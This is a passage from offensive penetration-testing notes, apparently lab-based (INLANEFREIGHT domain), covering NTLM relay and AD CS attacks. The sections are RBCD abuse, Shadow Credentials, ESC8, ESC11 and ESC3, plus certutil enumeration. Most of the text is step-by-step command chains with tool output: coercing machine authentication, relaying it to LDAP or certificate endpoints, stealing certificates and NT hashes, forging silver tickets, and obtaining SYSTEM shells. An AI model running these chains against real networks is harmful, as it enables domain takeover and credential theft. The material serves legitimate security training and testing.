    Coercer scan -t [target-ip] -u 'plaintext$' -p '[password]' -d [domain] -v
  • Active coercion with Coercer: 
    Coercer coerce -t [target-ip] -l [target-ip] -u 'plaintext$' -p '[password]' -d [domain] -v --always-continue
  • Coerce HTTP NTLM with Coercer v1.6 (WebDAV): 
    python3 Coercer.py -t [target-ip] -u 'plaintext$' -p '[password]' -wh SUPPORTPC2 -wp 80 -v
  • Enable WebDAV on target hosts via drop-sc: 
    crackmapexec smb [target-ip] -u anonymous -p '' -M drop-sc -o URL=https://[target-ip]/testing SHARE=smb FILENAME=@secret
crackmapexec smb [target-ip]/24 -u plaintext$ -p [password] -M webdav

9.10 Advanced NTLM Relay: Kerberos RBCD Abuse

Resource-based Constrained Delegation (RBCD) abuse via NTLM relay works by relaying the HTTP NTLM authentication of a target computer account over LDAP(S) to the DC, writing the attacker-controlled computer account (plaintext$) into the target's msDS-AllowedToActOnBehalfOfOtherIdentity attribute. This allows plaintext$ to impersonate any user against the target via S4U2Proxy.

Note: The target must have WebDAV enabled (so coercion produces HTTP rather than SMB auth), unless the DC is vulnerable to CVE-2019-1040 (--remove-mic option).

9.10.1 Enumeration

# Enable WebClient on SQL01 and WS01 via drop-sc
crackmapexec smb [target-ip] -u anonymous -p '' -M drop-sc -o URL=https://[target-ip]/testing FILENAME=@secret

# Verify WebDAV enabled
crackmapexec smb [target-ip]/24 -u plaintext$ -p [password] -M webdav
# WEBDAV  [target-ip]  445  WS01   WebClient Service enabled on: [target-ip]
# WEBDAV  [target-ip]  445  SQL01  WebClient Service enabled on: [target-ip]

9.10.2 Attack Chain

# Step 1 - Disable SMB/HTTP in Responder, start poisoning
sudo python3 Responder.py -I ens192    # SMB server = Off, HTTP server = Off

# Step 2 - Start ntlmrelayx targeting DC's LDAPS, abusing SQL01$'s auth
sudo ntlmrelayx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@[target-ip] --delegate-access --escalate-user 'plaintext$' --no-smb-server --no-dump

# Step 3 - Coerce SQL01$ via PrinterBug with WebDAV connection string
python3 printerbug.py [domain]/[user]:'[password]'@[target-ip] LINUX01@80/print
[*] HTTPD(80): Authenticating against ldaps://INLANEFREIGHT\[email protected] as INLANEFREIGHT/SQL01$ SUCCEED
[*] Delegation rights modified succesfully!
[*] plaintext$ can now impersonate users on SQL01$ via S4U2Proxy
# Step 4 - Add SQL01 to /etc/hosts
echo "[target-ip]   sql01   sql01.[domain]" >> /etc/hosts

# Step 5 - Request service ticket as Administrator via S4U2Proxy
getST.py -spn cifs/sql01.[domain] -impersonate Administrator -dc-ip [target-ip] "INLANEFREIGHT"/"plaintext$":"o6@ekK5#rlw2rAe"
[*] Impersonating Administrator
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
# Step 6 - Pass-the-ticket with psexec
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass sql01.[domain]
C:\Windows\system32> whoami
nt authority\system

Methodology

  • Enable WebDAV on target via drop-sc and verify: 
    crackmapexec smb [target-ip] -u anonymous -p '' -M drop-sc -o URL=https://[target-ip]/testing FILENAME=@secret
crackmapexec smb [target-ip]/24 -u plaintext$ -p [password] -M webdav
  • Start Responder (SMB/HTTP Off) and ntlmrelayx for RBCD: 
    sudo python3 Responder.py -I ens192
sudo ntlmrelayx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@[target-ip] --delegate-access --escalate-user 'plaintext$' --no-smb-server --no-dump
  • Coerce HTTP NTLM auth with PrinterBug (WebDAV string): 
    python3 printerbug.py [domain]/[user]:'[password]'@[target-ip] LINUX01@80/print
  • Request service ticket impersonating Administrator: 
    getST.py -spn cifs/sql01.[domain] -impersonate Administrator -dc-ip [target-ip] "INLANEFREIGHT"/"plaintext$":"o6@ekK5#rlw2rAe"
  • Pass-the-ticket to gain SYSTEM shell: 
    KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass sql01.[domain]

9.11 Advanced NTLM Relay: Shadow Credentials

Shadow Credentials is a persistence/lateral movement technique that adds alternative certificate-based credentials (msDS-KeyCredentialLink) to an account. Unlike password resets, shadow credentials persist across password changes. Requires PKINIT support (usually present when AD CS is installed).

The attack relays the NTLM authentication of an account that has write privileges over the target account's msDS-KeyCredentialLink attribute, over LDAP(S) to the DC:

# Responder with HTTP server Off
sudo python3 Responder.py -I ens192

# Relay cjaq's auth over LDAP to set shadow credentials on jperez
ntlmrelayx.py -t ldap://[domain]\\[email protected] --shadow-credentials --shadow-target jperez --no-da --no-dump --no-acl
[*] HTTPD(80): Authenticating against ldap://INLANEFREIGHT\[email protected] as INLANEFREIGHT/CJAQ SUCCEED
[*] Target user found: CN=Jeffry Perez,CN=Users,DC=[domain],DC=[tld]
[*] Generating certificate
[*] Updating the msDS-KeyCredentialLink attribute of jperez
[*] Saved PFX (#PKCS12) certificate & key at path: rbnYdUv8.pfx
[*] Must be used with password: NRzoep723H6Yfc0pY91Z
[*] Run the following command to obtain a TGT
[*] python3 PKINITtools/gettgtpkinit.py -cert-pfx rbnYdUv8.pfx -pfx-pass NRzoep723H6Yfc0pY91Z [domain]/[user] rbnYdUv8.ccache
# Get TGT using the PFX certificate
python3 gettgtpkinit.py -cert-pfx rbnYdUv8.pfx -pfx-pass NRzoep723H6Yfc0pY91Z [domain]/[user] jperez.ccache
# Authenticate as jperez via pass-the-ticket
KRB5CCNAME=jperez.ccache evil-winrm -i [dc].[domain] -r [domain]
*Evil-WinRM* PS C:\Users\jperez\Documents> whoami
[domain]\[user]

Methodology

  • Start Responder (HTTP server Off) and relay shadow credentials attack: 
    sudo python3 Responder.py -I ens192
ntlmrelayx.py -t ldap://[domain]\\[email protected] --shadow-credentials --shadow-target jperez --no-da --no-dump --no-acl
  • Get TGT from the PFX certificate: 
    python3 gettgtpkinit.py -cert-pfx rbnYdUv8.pfx -pfx-pass NRzoep723H6Yfc0pY91Z [domain]/[user] jperez.ccache
  • Authenticate as victim via pass-the-ticket: 
    KRB5CCNAME=jperez.ccache evil-winrm -i [dc].[domain] -r [domain]

9.12 Advanced NTLM Relay: ESC8 (AD CS Web Enrollment)

ESC8 = "NTLM Relay to AD CS HTTP Endpoints." If AD CS is deployed with a vulnerable web enrollment endpoint and a template allowing computer enrollment + client authentication (e.g., default Machine template), coercing any machine account and relaying SMB NTLM authentication over HTTP to the CA yields a certificate for that machine, enabling Silver Ticket attacks.

9.12.1 Enumeration

# Find ADCS server
crackmapexec ldap [target-ip]/24 -u 'plaintext$' -p '[password]' -M adcs
# ADCS  [target-ip]  Found PKI Enrollment Server: [dc].[domain]
# ADCS              Found CN: INLANEFREIGHT-[dc]-CA

# List enabled templates on the CA
crackmapexec ldap [target-ip] -u plaintext$ -p '[password]' -M adcs -o SERVER=INLANEFREIGHT-[dc]-CA
# ADCS  Found Certificate Template: Machine

# Check ESC vulnerabilities with Certipy
certipy find -enabled -u 'plaintext$'@[target-ip] -p '[password]' -stdout
  Web Enrollment                      : Enabled
  Request Disposition                 : Issue
  Enforce Encryption for Requests     : Disabled
  [!] Vulnerabilities
    ESC8  : Web Enrollment is enabled and Request Disposition is set to Issue
    ESC11 : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

Verify the web enrollment endpoint uses NTLM:

curl -I http://[target-ip]/certsrv/
# WWW-Authenticate: Negotiate
# WWW-Authenticate: NTLM

./NTLMRecon -t http://[target-ip]/ -o json | jq

9.12.2 Attack with ntlmrelayx

# Terminal 1 - relay to the ADCS HTTP endpoint
sudo ntlmrelayx.py -t http://[target-ip]/certsrv/certfnsh.asp -smb2support --adcs --template Machine

# Terminal 2 - coerce WS01$ via PrinterBug
python3 printerbug.py [domain]/[user]:'[password]'@[target-ip] [target-ip]
[*] Authenticating against http://[target-ip] as INLANEFREIGHT/WS01$ SUCCEED
[*] GOT CERTIFICATE! ID 14
[*] Base64 certificate of user WS01$:
MIIRPQIBAzCCEPcGCSqGSIb3DQEHAaCCEOgEghDk...
# Decode base64 certificate to PFX
echo -n "MIIRPQIBAzCCEP..." | base64 -d > ws01.pfx

# Request TGT using the certificate
python3 gettgtpkinit.py -dc-ip [target-ip] -cert-pfx ws01.pfx '[domain]/WS01$' ws01.ccache

# Retrieve NT hash of WS01$
KRB5CCNAME=ws01.ccache python3 getnthash.py '[domain]/WS01$' -key 917ec3b9d13dfb69e42ee05e09a5bf4ac4e52b7b677f1b22412e4deba644ebb2
Recovered NT Hash
3d3a72af94548ebc7755287a88476460
# Get domain SID
lookupsid.py '[domain]/WS01$'@[target-ip] -hashes :3d3a72af94548ebc7755287a88476460
# Domain SID is: S-1-5-21-1207890233-375443991-2397730614

# Forge silver ticket as Administrator
ticketer.py -nthash 3d3a72af94548ebc7755287a88476460 -domain-sid S-1-5-21-1207890233-375443991-2397730614 -domain [domain] -spn cifs/ws01.[domain] Administrator

# Pass-the-ticket
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass ws01.[domain]
C:\Windows\system32> whoami
nt authority\system

9.12.3 Attack with Certipy (Shorter Chain)

# Terminal 1 - Certipy relay
sudo certipy relay -target "http://[target-ip]" -template Machine

# Terminal 2 - Coerce WS01$ via PrinterBug
python3 printerbug.py [domain]/[user]:'[password]'@[target-ip] [target-ip]
[*] Got certificate with DNS Host Name 'WS01.[domain]'
[*] Saved certificate and private key to 'ws01.pfx'
# Authenticate and get NT hash directly
certipy auth -pfx ws01.pfx -dc-ip [target-ip]
# Got hash for 'ws01$@[domain]': aad3b435b51404eeaad3b435b51404ee:3d3a72af94548ebc7755287a88476460
Note: If you encounter KDC_ERR_PADATA_TYPE_NOSUPP, sync time with the DC: ntpdate [target-ip].

Methodology

  • Enumerate AD CS server and vulnerable templates: 
    crackmapexec ldap [target-ip]/24 -u 'plaintext$' -p '[password]' -M adcs
certipy find -enabled -u 'plaintext$'@[target-ip] -p '[password]' -stdout
curl -I http://[target-ip]/certsrv/
  • Relay to ADCS HTTP endpoint and coerce target: 
    sudo ntlmrelayx.py -t http://[target-ip]/certsrv/certfnsh.asp -smb2support --adcs --template Machine
python3 printerbug.py [domain]/[user]:'[password]'@[target-ip] [target-ip]
  • Decode certificate and get TGT: 
    echo -n "MIIRPQ..." | base64 -d > ws01.pfx
python3 gettgtpkinit.py -dc-ip [target-ip] -cert-pfx ws01.pfx '[domain]/WS01$' ws01.ccache
  • Retrieve NT hash of machine account: 
    KRB5CCNAME=ws01.ccache python3 getnthash.py '[domain]/WS01$' -key <AS-REP-key>
  • Forge silver ticket and get shell: 
    lookupsid.py '[domain]/WS01$'@[target-ip] -hashes :<nthash>
ticketer.py -nthash <nthash> -domain-sid <SID> -domain [domain] -spn cifs/ws01.[domain] Administrator
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass ws01.[domain]
  • Alternative - Certipy relay (shorter chain): 
    sudo certipy relay -target "http://[target-ip]" -template Machine
python3 printerbug.py [domain]/[user]:'[password]'@[target-ip] [target-ip]
certipy auth -pfx ws01.pfx -dc-ip [target-ip]

9.13 Advanced NTLM Relay: ESC11 (AD CS ICPR Endpoint)

ESC11 = "NTLM Relay to AD CS ICPR Endpoints." ICertPassage Remote Protocol (MS-ICPR/ICRP) exposes an RPC interface for certificate enrollment. If the CA does not have IF_ENFORCEENCRYPTICERTREQUEST set, unencrypted (relayed) sessions can enroll for certificates. Windows Server 2012+ enables this flag by default; admins sometimes disable it for XP compatibility.

Administrators can unset the flag with:

C:\Users\Administrator>certutil -setreg CA\InterfaceFlags -IF_ENFORCEENCRYPTICERTREQUEST

Use Certipy's relay command with the rpc:// scheme and the CA name; coerce SMB NTLM auth from a target, which Certipy relays over RPC/ICPR:

# Terminal 1 - Certipy relay over RPC/ICPR
certipy relay -target "rpc://[target-ip]" -ca "INLANEFREIGHT-[dc]-CA"

# Terminal 2 - Coerce WS01$ via PrinterBug
python3 printerbug.py [domain]/[user]:'[password]'@[target-ip] [target-ip]
[*] Targeting rpc://[target-ip] (ESC11)
[*] Attacking user 'WS01$@INLANEFREIGHT'
[*] Requesting certificate for user 'WS01$' with template 'Machine'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Saved certificate and private key to 'ws01.pfx'
# Authenticate and recover NT hash (same as ESC8)
certipy auth -pfx ws01.pfx -dc-ip [target-ip]
Note: ntlmrelayx only supports MS-TSCH for RPC relay; ICPR support remains in the ThePorgs fork. Use Certipy for ESC11 exploitation.

Methodology

  • Verify ESC11 vulnerability with Certipy: 
    certipy find -enabled -u 'plaintext$'@[target-ip] -p '[password]' -stdout
# ESC11 : Encryption is not enforced for ICPR requests
  • Start Certipy RPC relay and coerce target: 
    certipy relay -target "rpc://[target-ip]" -ca "INLANEFREIGHT-[dc]-CA"
python3 printerbug.py [domain]/[user]:'[password]'@[target-ip] [target-ip]
  • Authenticate with the certificate to recover NT hash: 
    certipy auth -pfx ws01.pfx -dc-ip [target-ip]

10. ADCS Attacks

Active Directory Certificate Services (AD CS) is Microsoft's PKI implementation. Misconfigured certificate templates - especially loose enrollment permissions or overly permissive EKU settings - allow attackers to escalate from a standard domain user to Domain Admin without ever touching a password.

10.1 ADCS Fundamentals

AD CS issues digital certificates inside the domain. Three core concepts determine the attack surface.

Component Role Attack Relevance
Certificate Authority (CA) Issues and signs certificates; validates requestor identity Misconfigured CA enrollment permissions enable impersonation
Public Key Infrastructure (PKI) Framework of rules, hardware, and software supporting cert trust Weak PKI design propagates trust to attacker-controlled certs
Certificate Templates Blueprints defining who can enroll, cert purpose, validity period Over-permissive templates are the primary ESC attack vector

10.1.1 Key Certificate Fields

Field Purpose Security Risk
Subject Alternative Name (SAN) Allows one cert to be valid for multiple identities If requester can specify SAN, they can impersonate Domain Admins
Extended Key Usage (EKU) Restricts cert purpose via OIDs (Client Auth, Server Auth, Secure Email) Missing EKU restrictions allow cert re-use across authentication contexts
Client Authentication OID Permits the cert to log into systems Required for PKINIT / Kerberos certificate-based auth abuse
Smart Card Logon EKU Required for KDC to accept PKINIT If absent on DC cert, PKINIT fails and PassTheCert path is needed instead

10.1.2 ESC Vulnerability Classes

ESC Root Cause Outcome
ESC1 Template allows requester to set SAN + Client Auth EKU enabled Any enrollee can request cert for any principal including DA
ESC2 Weak or missing issuance policies; Any Purpose EKU Cert usable for any purpose including authentication
ESC3 Certificate Request Agent template grants enrollment on behalf of others Attacker with agent cert can request certs for any user including DA

10.2 Enumeration with certutil

Use the built-in certutil tool to enumerate the CA and template configuration from any domain-joined machine.

# View general certificate configuration
certutil -dump

# List Certificate Authorities
certutil -ca

# List all certificate templates available to the CA
certutil -catemplates

# List all certificate templates
certutil -template

# Inspect a specific template by name
certutil -template ExampleTemplate

Check template permissions after listing - if Allow Full Control or Allow Write includes a group your account belongs to, template modification for privilege escalation may be possible.

10.2.1 Checking Installed Certificates via PowerShell

# List all certificate stores
Get-ChildItem cert:\

# Current user's certificates
Get-ChildItem cert:\CurrentUser\

# Current user's personal certs
Get-ChildItem cert:\CurrentUser\My

# System-wide certificates
Get-ChildItem cert:\LocalMachine\
Get-ChildItem cert:\LocalMachine\My

10.2.2 Exporting and Extracting Certificates

# Export a certificate (public key only) to .cer
$cert = Get-ChildItem -Path cert:\CurrentUser\My\<thumbprint>
Export-Certificate -Cert $cert -FilePath C:\Users\<username>\Desktop\user.cer

# Export certificate with private key to .pfx
$pw = ConvertTo-SecureString "password123" -AsPlainText -Force
$certificate = Get-ChildItem -Path cert:\CurrentUser\My\<thumbprint>
Export-PfxCertificate -Cert $certificate -FilePath user.pfx -Password $pw

Methodology

  • Enumerate CA and available templates: 
    certutil -ca
certutil -catemplates
certutil -template
  • Check installed certs on the machine: 
    Get-ChildItem cert:\CurrentUser\My
Get-ChildItem cert:\LocalMachine\My

10.3 ESC3 - Certificate Request Agent Abuse

ESC3 exploits a misconfigured Certificate Request Agent (CRA) template that permits enrollment on behalf of other principals. An attacker with a valid agent certificate can request certificates impersonating any user - including Domain Admins.

Conditions for ESC3 to be exploitable:

  • A CRA template exists and the attacker can enroll in it
  • A second template permits enrollment on behalf of another principal
  • No restrictions on who can be impersonated

10.3.1 ESC3 Exploit Flow

  1. Request a cert from the vulnerable WebServer template using the Certificate Request Agent policy
  2. Use that agent cert to request a second certificate on behalf of the domain admin
  3. Authenticate with the obtained cert to retrieve the admin NT hash
# Step 1: Request agent certificate using the WebServer template with Certificate Request Agent EKU
certipy req -u cert_admin -p '[password]' -dc-ip [target-ip] \
  -target [dc].[domain] -ca [ca-name] \
  -template WebServer -upn administrator@[domain] \
  -application-policies 'Certificate Request Agent'

# Step 2: Use agent cert to request certificate on behalf of Administrator
certipy req -u cert_admin -p '[password]' -dc-ip [target-ip] \
  -target [dc].[domain] -ca [ca-name] \
  -template User -pfx cert_admin.pfx \
  -on-behalf-of '[domain]\Administrator'

# Step 3: Authenticate with the obtained cert to get NT hash
certipy auth -pfx administrator.pfx -dc-ip [target-ip]

Sample certipy auth output:

[*] Certificate identities:
[*] SAN UPN: 'Administrator@[domain]'
[*] Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@[domain]'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
